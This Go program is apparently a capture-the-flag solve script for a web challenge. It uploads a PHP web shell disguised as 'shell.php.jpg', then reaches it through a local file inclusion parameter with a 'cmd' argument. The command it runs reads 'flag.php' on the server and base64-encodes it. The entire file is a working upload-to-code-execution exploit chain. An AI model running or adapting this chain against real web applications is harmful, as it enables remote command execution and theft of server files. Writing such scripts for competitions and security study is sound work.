package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
)

const base = "http://lfi.hax1.allesctf.net:8081"

var client = &http.Client{}
var pre = regexp.MustCompile(`<pre>.*`)

func main() {
	imageURL := upload("./shell.php.jpg")
	if imageURL == "" {
		log.Fatalln("Failed to upload exploit!")
	}
	fmt.Println(base + "/" + imageURL)
	parts := strings.Split(imageURL, "=")
	target := base + "/" + parts[0] + "=" + parts[len(parts)-1] + "&cmd=" + url.QueryEscape("cat flag.php | base64")
	fmt.Println(target)
	rsp, err := http.Get(target)
	checkErr(err)
	fmt.Println(rsp.StatusCode)

	flag, err := base64.StdEncoding.DecodeString(strings.ReplaceAll(pre.FindString(resStr(rsp)), "<pre>", ""))
	checkErr(err)
	fmt.Println(string(flag))
}

func upload(filePath string) string {
	var b bytes.Buffer
	// TODO: generate file with exploit
	f := mustOpen(filePath)
	mw := multipart.NewWriter(&b)
	fw, err := mw.CreateFormFile("file", f.Name())
	checkErr(err)
	_, err = io.Copy(fw, f)
	checkErr(err)
	mw.Close()
	req, err := http.NewRequest("POST", base+"/index.php?site=upload.php", &b)
	checkErr(err)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	rsp, err := client.Do(req)
	fmt.Printf("%v\n", rsp)
	result := resStr(rsp)
	if rsp.StatusCode != http.StatusOK {
		panic(fmt.Errorf("bad status: %s", rsp.Status))
	}
	fmt.Println(result)
	// 	  Upload successful: <a href="index.php?site=view.php&image=uploads/2d69cea3be32da34f34c98257b7cbc89.jpg">View the uploaded image</a></div></div>    </main>
	re := regexp.MustCompile(`Upload successful: <a href=".*"`)
	parts := strings.Split(re.FindString(result), `"`)
	if len(parts) > 2 {
		return parts[1]
	}
	return ""
}

func mustOpen(f string) *os.File {
	r, err := os.Open(f)
	if err != nil {
		panic(err)
	}
	return r
}

func resStr(rsp *http.Response) string {
	bytes, err := ioutil.ReadAll(rsp.Body)
	checkErr(err)
	return string(bytes)
}

func checkErr(err error) {
	if err != nil {
		panic(err)
	}
}

// func extract(s string, re )
